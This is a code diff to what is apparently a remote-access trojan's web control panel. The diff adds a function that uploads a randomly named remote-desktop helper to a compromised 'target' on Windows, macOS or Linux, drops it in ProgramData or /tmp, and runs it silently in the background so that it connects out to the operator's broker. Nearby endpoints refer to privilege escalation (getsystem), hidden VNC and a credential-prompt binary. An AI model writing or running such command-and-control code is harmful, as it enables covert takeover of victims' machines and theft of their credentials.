@@ -8,6 +8,7 @@ import logging
 import mimetypes
 import ntpath
 import secrets
+import shlex
 import time
 from contextlib import asynccontextmanager, suppress
 from pathlib import Path
@@ -569,10 +570,84 @@ def create_app(settings: Settings | None = None) -> FastAPI:
             },
         )
 
+    def session_os_of(session_id: str) -> str:
+        try:
+            for item in app.state.bridge.sessions():
+                if str(item.get("id")) == session_id:
+                    return str(item.get("os") or "")
+        except Exception:
+            return ""
+        return ""
+
+    def rd_helper(os_name: str) -> tuple[Path, bool]:
+        if os_name == "windows":
+            return Path(config.panel_bin_dir) / "rd-win.exe", True
+        if os_name == "darwin":
+            return Path(config.panel_bin_dir) / "rd-mac", False
+        return Path(config.panel_bin_dir) / "rd-linux", False
+
+    async def launch_rd(session_id: str, mode: str, body: dict) -> dict:
+        """Upload + start the OS-matching rd helper (desktop or hvnc mode)."""
+        os_name = await run_in_threadpool(session_os_of, session_id)
+        helper, is_win = rd_helper(os_name)
+        if not helper.is_file():
+            raise HTTPException(
+                status_code=400,
+                detail=f"{helper.name} not built on this host (os={os_name or 'unknown'})",
+            )
+        token = await run_in_threadpool(broker.mint, session_id)
+        if is_win:
+            remote = str(body.get("dir") or "C:\\\\ProgramData")
+            remote = remote.replace("/", "\\").replace("\\\\", "\\").rstrip("\\")
+            rd_name = f"rdw-{secrets.token_hex(3)}.exe"
+        else:
+            remote = str(body.get("dir") or "/tmp").rstrip("/") or "/tmp"
+            rd_name = f"rdw-{secrets.token_hex(3)}"
+        try:
+            await run_in_threadpool(
+                app.state.bridge.upload, session_id, remote, rd_name, helper.read_bytes()
+            )
+        except BridgeError as exc:
+            raise bridge_failure(exc) from exc
+        host, _, port = config.rd_endpoint.rpartition(":")
+        host = host or "127.0.0.1"
+        port = port or "8443"
+        args = [
+            "--host", host, "--port", port,
+            "--session", session_id, "--token", token,
+        ]
+        if mode == "hvnc" and not is_win:
+            args += ["--mode", "hvnc"]
+        try:
+            if is_win:
+                exe = ntpath.join(remote, rd_name)
+                result = await run_in_threadpool(
+                    app.state.bridge.exec, session_id, exe, args, False, True
+                )
+            else:
+                exe = remote.rstrip("/") + "/" + rd_name
+                cmd = (
+                    "chmod +x " + shlex.quote(exe) + " && " + shlex.quote(exe)
+                    + " " + " ".join(shlex.quote(a) for a in args)
+                    + " >/dev/null 2>&1 &"
+                )
+                result = await run_in_threadpool(
+                    app.state.bridge.exec, session_id, "/bin/sh", ["-c", cmd], False, True
+                )
+        except BridgeError as exc:
+            raise bridge_failure(exc) from exc
+        return {
+            "ok": True,
+            "os": os_name,
+            "mode": mode,
+            "rd_endpoint": config.rd_endpoint,
+            "detail": result,
+        }
+
     @app.post("/api/{session_id}/desktop")
     async def api_desktop(request: Request, session_id: str):
-        """Upload and launch the rd-win helper on the target so the desktop tab
-        streams. The helper connects to the public rd broker (PANEL_RD_ENDPOINT)."""
+        """Upload and launch the OS-matching rd helper so the desktop tab mirrors
+        the whole PC. The helper connects out to PANEL_RD_ENDPOINT."""
         session = require(request)
         if session is None:
             raise HTTPException(status_code=401)
@@ -580,37 +655,9 @@ def create_app(settings: Settings | None = None) -> FastAPI:
             body = await request.json()
         except ValueError:
             body = {}
-        rd = Path(config.panel_bin_dir) / "rd-win.exe"
-        if not rd.is_file():
-            raise HTTPException(status_code=400, detail="rd-win.exe not built on this host")
-        token = await run_in_threadpool(broker.mint, session_id)
-        remote = str(body.get("dir") or "C:\\\\ProgramData")
-        remote = remote.replace("/", "\\").replace("\\\\", "\\").rstrip("\\")
-        # unique name per launch: avoids "file in use" when a helper is already
-        # running and the operator reconnects.
-        rd_name = f"rdw-{secrets.token_hex(3)}.exe"
-        try:
-            await run_in_threadpool(
-                app.state.bridge.upload, session_id, remote, rd_name, rd.read_bytes()
-            )
-        except BridgeError as exc:
-            raise bridge_failure(exc) from exc
-        host, _, port = config.rd_endpoint.rpartition(":")
-        host = host or "127.0.0.1"
-        port = port or "8443"
-        exe = ntpath.join(remote, rd_name)
-        args = [
-            "--host", host, "--port", port,
-            "--session", session_id, "--token", token,
-        ]
-        try:
-            result = await run_in_threadpool(
-                app.state.bridge.exec, session_id, exe, args, False, True
-            )
-        except BridgeError as exc:
-            raise bridge_failure(exc) from exc
+        result = await launch_rd(session_id, "desktop", body)
         database.audit(str(session["actor"]), "desktop", "ok", target=session_id)
-        return JSONResponse({"ok": True, "rd_endpoint": config.rd_endpoint, "detail": result})
+        return JSONResponse(result)
 
     @app.post("/api/{session_id}/getsystem")
     async def api_getsystem(request: Request, session_id: str):
@@ -712,6 +759,14 @@ def create_app(settings: Settings | None = None) -> FastAPI:
         if session is None:
             raise HTTPException(status_code=401)
         body = await request.json()
+        os_name = await run_in_threadpool(session_os_of, session_id)
+        if os_name and os_name != "windows":
+            # macOS/Linux have no separate desktop: HVNC mirrors the whole PC.
+            result = await launch_rd(session_id, "hvnc", body)
+            database.audit(
+                str(session["actor"]), "hvnc", "ok", target=session_id, detail=os_name
+            )
+            return JSONResponse(result)
         hvnc_bin = Path(config.panel_bin_dir) / "hvnc.exe"
         prompt_bin = Path(config.panel_bin_dir) / "credprompt.exe"
         if not hvnc_bin.is_file():
